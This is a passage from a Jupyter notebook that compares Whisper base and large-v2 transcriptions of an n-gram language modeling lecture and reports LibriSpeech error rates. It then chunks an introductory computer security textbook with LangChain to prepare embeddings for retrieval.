    "len(base_text), len(large_text)\n",
    "\n",
    "i = 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "B: hi and welcome back to the week 3 lecture where we are talking about language modeling in this part we are going to be talking about generalization in the models we are going to start by thinking about models and how we might use them to generate previously unseen language to do that what i want us to do is consider a very very small toy by ground model which we might imagine has been trained on this very very small corpus here just 3 sentences here just to get us to think about what these models might look like and so we can represent these models as a kind of table or matrix and here we have word one and here we have word 2 if this was a trigram model we could actually here have the 2 previous words or a quadric of the 3 previous words but here what i am imagining is this table is a by ground model and it is telling us the probability of word 2 that is the word along here and given that the previous word was word one and we have this thing called a start token and we have an end token so actually when we see a sentence like i like to cook chinese food we have a start token at the beginning and an end token at the end and what we can see is if we look at the fact that we have got 3 sentences that means we have got 3 start tokens and we can think about which words can get the start of a sentence and that is what we have in this row here and we see that i is occurring in 2 out of 3 times and they is occurring in one out of 3 times obviously a real by ground model a real language model would be trained on much larger corpus and we would see a lot more different things occurring at the start of sentences but i said this is a kind of toy just to illustrate the probabilities then also how we can use them to generate so that is the start and then we can see if we go on okay so what can happen after an i well the words that we see after i in the corpus are like and want and they occur in 2 recoverances of i and in one case we have got like following i and in the other case we have got want following i so we see here in the table that we have got a probability of a half for the probability of like given i and a probability of a half for want given i and you can kind of stop the video and just have a look at this table and check that you understand how all of these probabilities would be generated from the co occurrence counts and my next i just shown what happens when we add one more sentence to this corpus so i have added a 4th sentence they eat chinese dinner so now we see that with 4 sentences 4 start tokens half of them have an i and half of them start with they and similarly in the case of what can happen after the word they we now have a half for want and a half for each rather than on the previous slide where we saw that they would always essentially had to be followed by want so what we can do and we imagine that actually you know we would build this up over very very large corpus even with this small toy example we can see how we can use such a model to start to generate sentences which might or seem plausible in the language but have never actually been occurred before so we can say okay this is a sample of my language can i have a new sentence that would be likely given the sentences that we have previously seen so how would we go about doing this well we can use something called the shannon visualization method and what we do is we generate a sequence from the language model that we have got as follows 1st thing we need to do is say well every sentence has to start with start token so that is a given and then we need to know what is going to be the 1st word in my sentence that i am generating and so what we do is we look at the probability distribution the probability of a word to given the start token and we choose the 1st word of the sentence that is going to go after start according to its probability so here we would look at this distribution here and we can see that there are 2 possibilities only 2 things can go at the start so we have to pick one of these 2 words and what we want to do is if we run this method 100s of times generating these sentences we would like to have this same distribution and follows so we want to have a kind of 50 50 chance or in each sentence of picking i and a 50 50 chance in each sentence of picking they in this particular case we have got to pick one of them 50 50 i tossed a coin and we came up with i we then need to generate the next token so we would go back to our language model and say well token the current token is i walk and come after i as we look at this particular row here and again we have got 2 possibilities like and want so we pick one of them at random and i picked want what comes after want actually in my corpus the only thing that ever came after want was 2 so i would have to pick 2 here what might come next well from 2 i have got to pick either cook or eat 2 thirds of the time i need to pick eat 13rd of the time i need to pick cook this time i picked the most likely one that would always be the case not every time i generate a sentence using this method should i pick the most likely one but i need to pick it 2 thirds of the time so i have picked it i am here then from eat we need to pick one out of chinese dinner and indian so i picked chinese and then from chinese i need to choose between dinner and food and here i picked food and then from food and the last thing is some food we had to basically have the end of the sentence because food is always at the end of the sentences in this corpus nothing else can follow and so what we have got is a sentence i want to eat chinese food which is plausible has been generated by this language model it never occurred in my original corpus but all of those combinations the by gram combinations did occur and we can do this with different engra models and people have kind of you know in the past had a bit of fun with doing this tried to kind of approximate shakespeare so taking the shakespeare corpus she is all kind of shakespeare plays which has almost a 1000000 tokens and 29000 different prototypes and sizes of vocabulary and if you use this method with unigrams this is an example of what you might come up with so this is just picking in turn a unigram based according to its probability and you might see that yes there were some sort of shakespeare like words but it does not really make much sense because it is just unigrams there is no attention to the previous words which have occurred then when we go to bygams we get something which seems a little bit more meaningful what it means sir i confess she and also he is trim captain maybe does not really make sense but it seems to almost you know possibly be you know seems like english but just english that does not really make sense go to a try gam this show forbid it should be branded if we now made it empty bit better and then we go up to our 4 grams we get something like king henry what i will go seek the traitor gloucester excellent some of the watch a great banquet served in it cannot be but say and it starts actually sound like shakespeare but there is actually a problem with this and this is kind of trying to kind of demonstrate the kind of almost the need to generalize what is coming out when we kind of have a foreground model is it looks like shakespeare because it is actually just bits of shakespeare which have been remembered from the text that the 4 grams are things which have occurred in shakespeare so we would generate this and then the next foreground would have to be something that is come from shakespeare as well and so we are not getting any generalization we are not really getting anything new and we can think about this if we again we think about the sparsity problem we thought about before if we actually look at the kind of the training data which as i said was a 1000000 tokens over vocabulary of almost 30 0 with 30000 unigrams there are almost 840000000 possible bygrams if bygrams could occur you know there were no dependencies between the words which words could occur next to each other in a corpus of this size and well in fact that it is using actual kind of the english language rules and what actually shakespeare wrote and if we count up the different number of bygram types the different number of distinct bygrams within the shakespeare corpus we see that there are 300000 that have actually occurred now obviously not all 840000000 are actually possible in the language but actually what we are seeing here is that 99\n",
      "L: hi and welcome back to the week 3 lecture where we are talking about n gram language modeling in this part we are going to be talking about generalization in the models so we are going to start by thinking about our models and how we might use them to generate previously unseen language to do that what i want us to do is consider a very very small toy bigram model which we might imagine has been trained on this very very small corpus here just 3 sentences here just to get us to think about what these models might look like and so we can represent these models as a kind of table or matrix and here we have word one and here we have word 2 if this was a trigram model we could actually here have the 2 previous words or a quadricam the 3 previous words but here what i am imagining is this table is a bigram model and it is telling us the probability of word 2 that is the word along here given that the previous word was word one and we have this thing called a start token and we have an end token so actually when we see a sentence like i like to cook chinese food we have a start token at the beginning and an end token at the end and what we can see is if we look at the fact that we have got 3 sentences that means we have got 3 start tokens and we can think about which words can go at the start of a sentence and that is what we have in this row here and we see that i is occurring in 2 out of 3 times and they is occurring in one out of 3 times obviously a real bigram model a real language model would be trained on much larger corpus and we would see a lot more different things occurring at the start of sentences but as i said this is a kind of toy just to illustrate the probabilities and then also how we can use them to generate so that is the start and then we can see if we go on okay so what can happen after i well the words that we see after i in the corpus are like and want and they occur in the 2 occurrences of i and in one case we have got like following i and in the other case we have got want following i so we see here in the table that we have got a probability of a half for the probability of like given i and a probability of a half for want given i and you can kind of stop the video and just have a look at this table and check that you understand how all of these probabilities would be generated from the co occurrence counts and my next i have just shown what happens when we add one more sentence to this corpus so i have added a 4th sentence they eat chinese dinner so now we see that with 4 sentences 4 start tokens half of them have i and half of them start with they and similarly in the case of what can happen after the word they we now have a half for want and a half for each rather than on the previous slide where we saw that they was always essentially had to be followed by want so what we can do here and we imagine that actually you know we would build this up over a very very large corpus but even with this small toy example we can see how we can use such a model to start to generate sentences which might seem plausible in the language but have never actually been occurred before so we can say okay this is a sample of my language can i have a new sentence that would be likely given the sentences that we have previously seen so how would we go about doing this well we could use something called the shannon visualization method and what we do is we generate a sequence from the language model that we have got as follows 1st thing we need to do is say well every sentence has to start with a start token so that is a given and then we need to know what is going to be the 1st word in my sentence that i am generating and so what we do is we look at the probability distribution the probability of a word to given the start token and we choose the 1st word of the sentence that is going to go after start according to its probability so here we would look at this distribution here and we can see that there are 2 possibilities only 2 things can go at the start so we have to pick one of these 2 words and what we want to do so if we run this method 100s of times generating new sentences we would like to have this same distribution unfollowed so we want to have a kind of 50 50 chance in each sentence of picking i and a 50 50 chance in each sentence of picking they in this particular case we have got to pick one of them it is 50 50 i trust a coin and we came up with i we then need to generate the next token so we would go back to our language model and say well token current token is i what can come after i so we look at this particular row here and again we have got 2 possibilities like and want so we pick one of them at random and i picked want what comes after want and actually in my corpus the only thing that ever came after want was 2 so i would have to pick 2 here what might come next well from 2 i have got to pick either cook or eat 2 thirds of the time i need to pick eat 13rd of the time i need to pick cook this time i picked the most likely one that would not always be the case not every time i generate a sentence using this method should i pick the most likely one but i need to pick it 2 thirds of the time so i have picked it here then from eat we need to pick one out of chinese dinner and indian so i have picked chinese and then from chinese i need to choose between dinner and food and here i have picked food and then from food and the last thing is from food we have to basically have the end of the sentence because food is always at the end of sentences in this corpus nothing else can follow and so what we have got is the sentence i want to eat chinese food which is plausible has been generated by this language model it never occurred in my original corpus but all of those combinations the bigram combinations did occur and we can do this with different ngram models and people have in the past had a bit of fun with doing this tried to approximate shakespeare so i have taken the shakespeare corpus which is all shakespeare plays which has almost a 1000000 tokens a 1000000 tokens and 29000 different word types that is the size of vocabulary and if you use this method with unigrams this is an example of what you might come up with so this is just picking in turn a unigram based according to its probability and you might see that yes there are some sort of shakespeare like words but it does not really make much sense because it is just unigrams there is no attention to the previous words which have occurred then when we go to bigrams we get something which seems a little bit more meaningful what means sir i confess she and also he is trim captain maybe it does not really make sense but it seems to almost possibly be okay seems like english but just english that does not really make sense go to trigram this shall forbid it should be branded if we now made it empty bit better and then we go up to our fourgrams we get something like king henry what i will go seek the traitor gloucester excellent some of the watch a great banquet served in it cannot be but say and it starts to actually sound like shakespeare but there is actually a problem with this and this is kind of trying to kind of demonstrate the kind of almost the need to generalize what is coming out when we kind of have a fourgram model is it looks like shakespeare because it is actually just bits of shakespeare which have been remembered from the text that the fourgrams are things which have occurred in shakespeare so we would generate this and then the next fourgram would have to be something that is come from shakespeare as well and so we are not getting any generalization we are not really getting anything new and we can think about this if we again we think about sparsity problem we thought about before if we actually look at the kind of the training data which as i said was a 1000000 tokens over vocabulary of almost 30000 with 30000 unigrams there are almost 840000000 possible bigrams if bigrams could occur there were no dependencies between the words which words could occur next to each other in a corpus of this size and well in fact that it is using actual kind of the english language rules and what actually shakespeare wrote if we count up the different number of bigram types the different number of distinct bigrams within the shakespeare corpus we see that there are 300000 that have actually occurred now obviously not all 840000000 are actually possible in the language but actually what we are seeing here is that 99\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(f\"B: {base_text[i]}\")\n",
    "print(f\"L: {large_text[i]}\")\n",
    "print()\n",
    "\n",
    "i += 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "base model output: \n",
    "\n",
    "Hi and welcome back to the week 3 lecture where we're talking about ***n-gram (missing)*** language modeling. In this part we're going to be talking about generalization in the models. We're going to start by thinking about ***our (missing-not sure)*** models and how we might use them to generate previously unseen language. To do that what I want us to do is consider a very very small toy ***by-ground (bigram)*** model which we might imagine has been trained on this very very small corpus here, just three sentences here just to get us to think about what these models might look like. And so we can represent these models as a kind of table or matrix. And here we have word one and here we have word two. \n",
    "\n",
    "large-v2 model output: \n",
    "\n",
    "Hi, and welcome back to the week three lecture, where we're talking about N-gram language modelling. In this part, we're going to be talking about generalisation in the models. ***So (too sensitive)*** we're going to start by thinking about our models and how we might use them to generate previously unseen language. To do that, what I want us to do is consider a very, very small toy bigram model, which we might imagine has been trained on this very, very small corpus here. Just three sentences here, just to get us to think about what these models might look like. And so we can represent these models as a kind of table or matrix. And here we have word one, and here we have word two. \n",
    "\n",
    "The large-v2 model didn't make the mistakes that base model did. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Test performance on public dataset: LibriSpeech test clean"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[Test model in Colab cause need GPU and not support mps, the codes pls look at the link. ](https://colab.research.google.com/drive/1qGQbPkOizMdeHC6ow0qlvRizXZwleO_f?usp=sharing)\n",
    "\n",
    "The base.en model got WER: 4.26 %, large-v2 got WER: 2.65 %, large-v3 got WER: 2.03%"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the paper, Whisper Large V2 got WER of 2.7% on LibriSpeech test clean similar to wev2vec 2.0 and base.en got WER of 4.2%. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<img src=\"figures/WhisperPerformance-compareWithHuman.png\" width=\"800px\"/>\n",
    "\n",
    "The Whisper paper said the model performance is very close to human level transcription"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Chunck docs to small documents"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "from langchain.text_splitter import RecursiveCharacterTextSplitter"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "chunk_size = 20000\n",
    "chunk_overlap = 1000\n",
    "\n",
    "# chunk_size = 8000\n",
    "# chunk_overlap = 400\n",
    "\n",
    "text_splitter = RecursiveCharacterTextSplitter(separators=[\"\\n\\n\", \"\\n\", \"\\t\"], chunk_size=chunk_size, chunk_overlap=chunk_overlap)\n",
    "docs = text_splitter.split_documents(pdfs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Document count: 68\n"
     ]
    }
   ],
   "source": [
    "print(f\"Document count: {len(docs)}\")\n",
    "# print(docs[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'source': 'docs/computer-security-principles-practice-4th-global_part1-2.pdf',\n",
       " 'page': 0}"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "docs[0].metadata"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "page_content='23\\r\\n1.1 Computer Security Concepts\\r\\nA Definition of Computer Security\\r\\nExamples\\r\\nThe Challenges of Computer Security\\r\\nA Model for Computer Security\\r\\n1.2 Threats, Attacks, and Assets\\r\\nThreats and Attacks\\r\\nThreats and Assets\\r\\n1.3 Security Functional Requirements\\r\\n1.4 Fundamental Security Design Principles\\r\\n1.5 Attack Surfaces and Attack Trees\\r\\nAttack Surfaces\\r\\nAttack Trees\\r\\n1.6 Computer Security Strategy\\r\\nSecurity Policy\\r\\nSecurity Implementation\\r\\nAssurance and Evaluation\\r\\n1.7 Standards\\r\\n1.8 Key Terms, Review Questions, and Problems\\r\\nOverview\\r\\nCHAPTER\\r\\nM01_STAL0611_04_GE_C01.indd 23 10/10/17 9:22 PM\\n\\n\\n24 CHAPTER 1 / OVERVIEW\\r\\nThis chapter provides an overview of computer security. We begin with a discussion \\r\\nof what we mean by computer security. In essence, computer security deals with \\r\\ncomputer-related assets that are subject to a variety of threats and for which various \\r\\nmeasures are taken to protect those assets. Accordingly, the next section of this \\r\\nchapter provides a brief overview of the categories of computer-related assets that \\r\\nusers and system managers wish to preserve and protect, and a look at the various \\r\\nthreats and attacks that can be made on those assets. Then, we survey the measures \\r\\nthat can be taken to deal with such threats and attacks. This we do from three dif\\ufffeferent viewpoints, in Sections 1.3 through 1.5. We then lay out in general terms a \\r\\ncomputer security strategy.\\r\\nThe focus of this chapter, and indeed this book, is on three fundamental \\r\\nquestions:\\r\\n1. What assets do we need to protect?\\r\\n2. How are those assets threatened?\\r\\n3. What can we do to counter those threats?\\r\\n1.1 COMPUTER SECURITY CONCEPTS\\r\\nA Definition of Computer Security\\r\\nThe NIST Internal/Interagency Report NISTIR 7298 (Glossary of Key Information \\r\\nSecurity Terms, May 2013) defines the term computer security as follows:\\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Describe the key security requirements of confidentiality, integrity, and \\r\\navailability.\\r\\n◆ Discuss the types of security threats and attacks that must be dealt with \\r\\nand give examples of the types of threats and attacks that apply to different \\r\\ncategories of computer and network assets.\\r\\n◆ Summarize the functional requirements for computer security.\\r\\n◆ Explain the fundamental security design principles.\\r\\n◆ Discuss the use of attack surfaces and attack trees.\\r\\n◆ Understand the principle aspects of a comprehensive security strategy.\\r\\nComputer Security: Measures and controls that ensure confidentiality, integrity, \\r\\nand availability of information system assets including hardware, software, firm\\ufffeware, and information being processed, stored, and communicated.\\r\\nM01_STAL0611_04_GE_C01.indd 24 10/10/17 9:22 PM\\n\\n\\n1.1 / COMPUTER SECURITY CONCEPTS 25\\r\\nThis definition introduces three key objectives that are at the heart of computer \\r\\nsecurity:\\r\\n• Confidentiality: This term covers two related concepts:\\r\\n— Data confidentiality:1\\r\\n Assures that private or confidential information is \\r\\nnot made available or disclosed to unauthorized individuals.\\r\\n— Privacy: Assures that individuals control or influence what information \\r\\nrelated to them may be collected and stored and by whom and to whom that \\r\\ninformation may be disclosed.\\r\\n• Integrity: This term covers two related concepts:\\r\\n— Data integrity: Assures that information and programs are changed only \\r\\nin a specified and authorized manner.\\r\\n— System integrity: Assures that a system performs its intended function in \\r\\nan unimpaired manner, free from deliberate or inadvertent unauthorized \\r\\nmanipulation of the system.\\r\\n• Availability: Assures that systems work promptly and service is not denied to \\r\\nauthorized users.\\r\\nThese three concepts form what is often referred to as the CIA triad. The three \\r\\nconcepts embody the fundamental security objectives for both data and for information \\r\\nand computing services. For example, the NIST standard FIPS 199 (Standards for Security \\r\\nCategorization of Federal Information and Information Systems, February 2004) lists con\\ufffefidentiality, integrity, and availability as the three security objectives for information and \\r\\nfor information systems. FIPS 199 provides a useful characterization of these three objec\\ufffetives in terms of requirements and the definition of a loss of security in each category:\\r\\n• Confidentiality: Preserving authorized restrictions on information access and \\r\\ndisclosure, including means for protecting personal privacy and proprietary infor\\ufffemation. A loss of confidentiality is the unauthorized disclosure of information.\\r\\n• Integrity: Guarding against improper information modification or destruction, \\r\\nincluding ensuring information nonrepudiation and authenticity. A loss of integ\\uffferity is the unauthorized modification or destruction of information.\\r\\n• Availability: Ensuring timely and reliable access to and use of information. \\r\\nA loss of availability is the disruption of access to or use of information or an \\r\\ninformation system.\\r\\nAlthough the use of the CIA triad to define security objectives is well estab\\ufffelished, some in the security field feel that additional concepts are needed to present a \\r\\ncomplete picture (see Figure 1.1). Two of the most commonly mentioned are as follows:\\r\\n• Authenticity: The property of being genuine and being able to be verified and \\r\\ntrusted; confidence in the validity of a transmission, a message, or message \\r\\n1\\r\\nRFC 4949 (Internet Security Glossary, August 2007) defines information as “facts and ideas, which can \\r\\nbe represented (encoded) as various forms of data,” and data as “information in a specific physical rep\\uffferesentation, usually a sequence of symbols that have meaning; especially a representation of information \\r\\nthat can be processed or produced by a computer.” Security literature typically does not make much of a \\r\\ndistinction; nor does this book.\\r\\nM01_STAL0611_04_GE_C01.indd 25 10/10/17 9:22 PM\\n\\n\\n26 CHAPTER 1 / OVERVIEW\\r\\noriginator. This means verifying that users are who they say they are and that \\r\\neach input arriving at the system came from a trusted source.\\r\\n• Accountability: The security goal that generates the requirement for actions \\r\\nof an entity to be traced uniquely to that entity. This supports nonrepudiation, \\r\\ndeterrence, fault isolation, intrusion detection and prevention, and after-action \\r\\nrecovery and legal action. Because truly secure systems are not yet an achiev\\ufffeable goal, we must be able to trace a security breach to a responsible party. \\r\\nSystems must keep records of their activities to permit later forensic analysis \\r\\nto trace security breaches or to aid in transaction disputes.\\r\\nNote that FIPS 199 includes authenticity under integrity.\\r\\nExamples\\r\\nWe now provide some examples of applications that illustrate the requirements just \\r\\nenumerated.2\\r\\n For these examples, we use three levels of impact on organizations or \\r\\nindividuals should there be a breach of security (i.e., a loss of confidentiality, integrity, \\r\\nor availability). These levels are defined in FIPS 199:\\r\\n• Low: The loss could be expected to have a limited adverse effect on organiza\\ufffetional operations, organizational assets, or individuals. A limited adverse effect \\r\\nmeans that, for example, the loss of confidentiality, integrity, or availability \\r\\nmight: (i) cause a degradation in mission capability to an extent and duration \\r\\nthat the organization is able to perform its primary functions, but the effec\\ufffetiveness of the functions is noticeably reduced; (ii) result in minor damage to \\r\\norganizational assets; (iii) result in minor financial loss; or (iv) result in minor \\r\\nharm to individuals.\\r\\n2\\r\\nThese examples are taken from a security policy document published by the Information Technology \\r\\nSecurity and Privacy Office at Purdue University.\\r\\nFigure 1.1 Essential Network and \\r\\nComputer Security Requirements\\r\\nData\\r\\nand\\r\\nservices\\r\\nAvailability\\r\\nIntegrity\\r\\nAccountability\\r\\nAuthenticity\\r\\nConfidentiality\\r\\nM01_STAL0611_04_GE_C01.indd 26 10/10/17 9:22 PM\\n\\n\\n1.1 / COMPUTER SECURITY CONCEPTS 27\\r\\n• Moderate: The loss could be expected to have a serious adverse effect on \\r\\norganizational operations, organizational assets, or individuals. A serious \\r\\nadverse effect means that, for example, the loss might: (i) cause a significant \\r\\ndegradation in mission capability to an extent and duration that the organiza\\ufffetion is able to perform its primary functions, but the effectiveness of the func\\ufffetions is significantly reduced; (ii) result in significant damage to organizational \\r\\nassets; (iii) result in significant financial loss; or (iv) result in significant harm to \\r\\nindividuals that does not involve loss of life or serious life-threatening injuries.\\r\\n• High:The loss could be expected to have a severe or catastrophic adverse effect \\r\\non organizational operations, organizational assets, or individuals. A severe or \\r\\ncatastrophic adverse effect means that, for example, the loss might: (i) cause a \\r\\nsevere degradation in or loss of mission capability to an extent and duration \\r\\nthat the organization is not able to perform one or more of its primary func\\ufffetions; (ii) result in major damage to organizational assets; (iii) result in major \\r\\nfinancial loss; or (iv) result in severe or catastrophic harm to individuals involv\\ufffeing loss of life or serious life-threatening injuries.\\r\\nCONFIDENTIALITY Student grade information is an asset whose confidentiality is\\r\\nconsidered to be highly important by students. In the United States, the release of \\r\\nsuch information is regulated by the Family Educational Rights and Privacy Act \\r\\n(FERPA). Grade information should only be available to students, their parents, and \\r\\nemployees that require the information to do their job. Student enrollment informa\\ufffetion may have a moderate confidentiality rating. While still covered by FERPA, this \\r\\ninformation is seen by more people on a daily basis, is less likely to be targeted than \\r\\ngrade information, and results in less damage if disclosed. Directory information, such \\r\\nas lists of students or faculty or departmental lists, may be assigned a low confiden\\ufffetiality rating or indeed no rating. This information is typically freely available to the \\r\\npublic and published on a school’s website.\\r\\nINTEGRITY Several aspects of integrity are illustrated by the example of a hospital \\r\\npatient’s allergy information stored in a database. The doctor should be able to trust \\r\\nthat the information is correct and current. Now, suppose an employee (e.g., a nurse) \\r\\nwho is authorized to view and update this information deliberately falsifies the data \\r\\nto cause harm to the hospital. The database needs to be restored to a trusted basis \\r\\nquickly, and it should be possible to trace the error back to the person responsible. \\r\\nPatient allergy information is an example of an asset with a high requirement for \\r\\nintegrity. Inaccurate information could result in serious harm or death to a patient, \\r\\nand expose the hospital to massive liability.\\r\\nAn example of an asset that may be assigned a moderate level of integrity \\r\\nrequirement is a website that offers a forum to registered users to discuss some spe\\ufffecific topic. Either a registered user or a hacker could falsify some entries or deface the \\r\\nwebsite. If the forum exists only for the enjoyment of the users, brings in little or no \\r\\nadvertising revenue, and is not used for something important such as research, then \\r\\npotential damage is not severe. The Webmaster may experience some data, financial, \\r\\nand time loss.\\r\\nAn example of a low integrity requirement is an anonymous online poll. Many \\r\\nwebsites, such as news organizations, offer these polls to their users with very few \\r\\nM01_STAL0611_04_GE_C01.indd 27 10/10/17 9:22 PM\\n\\n\\n28 CHAPTER 1 / OVERVIEW\\r\\nsafeguards. However, the inaccuracy and unscientific nature of such polls is well \\r\\nunderstood.\\r\\nAVAILABILITY The more critical a component or service is, the higher will be the \\r\\nlevel of availability required. Consider a system that provides authentication services \\r\\nfor critical systems, applications, and devices. An interruption of service results in the \\r\\ninability for customers to access computing resources and staff to access the resources \\r\\nthey need to perform critical tasks. The loss of the service translates into a large \\r\\nfinancial loss in lost employee productivity and potential customer loss.\\r\\nAn example of an asset that would typically be rated as having a moderate \\r\\navailability requirement is a public website for a university; the website provides \\r\\ninformation for current and prospective students and donors. Such a site is not a \\r\\ncritical component of the university’s information system, but its unavailability will \\r\\ncause some embarrassment.\\r\\nAn online telephone directory lookup application would be classified as a low \\r\\navailability requirement. Although the temporary loss of the application may be an \\r\\nannoyance, there are other ways to access the information, such as a hardcopy direc\\ufffetory or the operator.\\r\\nThe Challenges of Computer Security\\r\\nComputer security is both fascinating and complex. Some of the reasons are as follows:\\r\\n1. Computer security is not as simple as it might first appear to the novice. The \\r\\nrequirements seem to be straightforward; indeed, most of the major require\\ufffements for security services can be given self-explanatory one-word labels: \\r\\nconfidentiality, authentication, nonrepudiation, and integrity. But the mecha\\ufffenisms used to meet those requirements can be quite complex, and understanding \\r\\nthem may involve rather subtle reasoning.\\r\\n2. In developing a particular security mechanism or algorithm, one must always con\\ufffesider potential attacks on those security features. In many cases, successful attacks \\r\\nare designed by looking at the problem in a completely different way, therefore \\r\\nexploiting an unexpected weakness in the mechanism.\\r\\n3. Because of Point 2, the procedures used to provide particular services are often \\r\\ncounterintuitive. Typically, a security mechanism is complex, and it is not obvious \\r\\nfrom the statement of a particular requirement that such elaborate measures are \\r\\nneeded. Only when the various aspects of the threat are considered do elaborate \\r\\nsecurity mechanisms make sense.\\r\\n4. Having designed various security mechanisms, it is necessary to decide where to \\r\\nuse them. This is true both in terms of physical placement (e.g., at what points in \\r\\na network are certain security mechanisms needed) and in a logical sense [e.g., \\r\\nat what layer or layers of an architecture such as TCP/IP (Transmission Control \\r\\nProtocol/Internet Protocol) should mechanisms be placed].\\r\\n5. Security mechanisms typically involve more than a particular algorithm or \\r\\nprotocol. They also require that participants be in possession of some secret \\r\\ninformation (e.g., an encryption key), which raises questions about the creation, \\r\\ndistribution, and protection of that secret information. There may also be a reli\\ufffeance on communications protocols whose behavior may complicate the task of \\r\\nM01_STAL0611_04_GE_C01.indd 28 10/10/17 9:22 PM\\n\\n\\n1.1 / COMPUTER SECURITY CONCEPTS 29\\r\\ndeveloping the security mechanism. For example, if the proper functioning of the \\r\\nsecurity mechanism requires setting time limits on the transit time of a message \\r\\nfrom sender to receiver, then any protocol or network that introduces variable, \\r\\nunpredictable delays may render such time limits meaningless.\\r\\n6. Computer security is essentially a battle of wits between a perpetrator who tries \\r\\nto find holes, and the designer or administrator who tries to close them. The great \\r\\nadvantage that the attacker has is that he or she need only find a single weak\\ufffeness, while the designer must find and eliminate all weaknesses to achieve perfect \\r\\nsecurity.\\r\\n7. There is a natural tendency on the part of users and system managers to perceive \\r\\nlittle benefit from security investment until a security failure occurs.\\r\\n8. Security requires regular, even constant monitoring, and this is difficult in today’s \\r\\nshort-term, overloaded environment.\\r\\n9. Security is still too often an afterthought to be incorporated into a system after\\r\\nthe design is complete, rather than being an integral part of the design process.\\r\\n10. Many users and even security administrators view strong security as an impedi\\ufffement to efficient and user-friendly operation of an information system or use \\r\\nof information.\\r\\nThe difficulties just enumerated will be encountered in numerous ways as we \\r\\nexamine the various security threats and mechanisms throughout this book.\\r\\nA Model for Computer Security\\r\\nWe now introduce some terminology that will be useful throughout the book.3 Table \\r\\n1.1 defines terms and Figure 1.2, based on [CCPS12a], shows the relationship among \\r\\nsome of these terms. We start with the concept of a system resource or asset, that \\r\\nusers and owners wish to protect. The assets of a computer system can be categorized \\r\\nas follows:\\r\\n• Hardware: Including computer systems and other data processing, data storage, \\r\\nand data communications devices.\\r\\n• Software: Including the operating system, system utilities, and applications.\\r\\n• Data: Including files and databases, as well as security-related data, such as \\r\\npassword files.\\r\\n• Communication facilities and networks: Local and wide area network com\\ufffemunication links, bridges, routers, and so on.\\r\\nIn the context of security, our concern is with the vulnerabilities of system \\r\\nresources. [NRC02] lists the following general categories of vulnerabilities of a com\\ufffeputer system or network asset:\\r\\n• The system can be corrupted, so it does the wrong thing or gives wrong answers. \\r\\nFor example, stored data values may differ from what they should be because \\r\\nthey have been improperly modified.\\r\\n3\\r\\nSee Chapter 0 for an explanation of RFCs.\\r\\nM01_STAL0611_04_GE_C01.indd 29 10/10/17 9:22 PM' metadata={'source': 'docs/computer-security-principles-practice-4th-global_part1-2.pdf', 'page': 0}\n"
     ]
    }
   ],
   "source": [
    "print(docs[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Embed text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from dotenv import load_dotenv\n",
    "load_dotenv()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "from langchain_openai import OpenAI\n",
    "from langchain_openai import OpenAIEmbeddings\n",
    "from langchain_community.embeddings import HuggingFaceInstructEmbeddings\n",
    "from langchain.vectorstores import FAISS, Chroma"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "embeddings = OpenAIEmbeddings()\n",
    "# embeddings = HuggingFaceInstructEmbeddings(model_name=\"hkunlp/instructor-xl\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Total characters: 1273801\n",
      "Total tokens: 274274\n"
     ]
    }
   ],
   "source": [
    "from langchain_openai import OpenAI\n",
    "\n",
    "llm = OpenAI()\n",
    "# llm.get_num_tokens(\" \".join([x.page_content for x in docs]))\n",
    "print(f\"Total characters: {len(' '.join([x.page_content for x in docs]))}\")\n",
    "print(f\"Total tokens: {llm.get_num_tokens(' '.join([x.page_content for x in docs]))}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "    PyPDFium2Loader:\n",
    "\n",
    "Total characters: 20006\n",
    "\n",
    "Total tokens: 4177\n",
    "\n",
    "    UnstructuredPDFLoader:\n",
    "\n",
    "Total characters: 19592\n",
    "\n",
    "Total tokens: 4095"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Callback:\n",
      " Tokens Used: 0\n",
      "\tPrompt Tokens: 0\n",
      "\tCompletion Tokens: 0\n",
      "Successful Requests: 0\n",
      "Total Cost (USD): $0.0\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "from langchain_community.callbacks import get_openai_callback\n",
    "\n",
    "# vectors = embeddings.embed_documents([x.page_content for x in docs])\n",
